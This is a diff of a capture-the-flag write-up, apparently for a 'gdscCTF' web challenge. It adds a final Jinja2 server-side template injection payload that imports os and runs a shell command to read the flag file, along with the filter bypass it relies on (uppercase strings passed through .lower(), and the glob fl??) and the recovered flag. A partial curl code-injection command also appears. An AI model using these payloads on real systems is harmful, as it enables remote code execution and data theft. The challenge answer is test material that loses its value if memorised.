@@ -89,4 +89,18 @@ curl -G https://chall1.pxxl.xyz/run_file -d "code=-c%0aeval(\"__import__(\'os\')
 x: "{{7*7}}"
 ```
 
-- 
+- Final payload-:
+
+```
+x: "{{config.__init__.__globals__.__getitem__('__BUILTINS__'.lower()).__getitem__('__IMPORT__'.lower())('OS'.lower()).popen('base64 /app/fl??/*.txt | base64 -d').read()}}"
+```
+
+- You can bypass the filtered strings by setting it to uppercase and passing it to python's lower function as soon as it is parsed.Lastly. the word `flag` gets filtered which you can bypass with regex e.g `fl?? should match flag`.
+- Flag-: ```gdscCTF{4c4dae5677c29dcdcd06ba88565602fa}```
+
+![image](https://github.com/user-attachments/assets/9bb1bb33-8913-4bf3-be94-5e2f4796dfe5)
+
+----------------
+
+
+
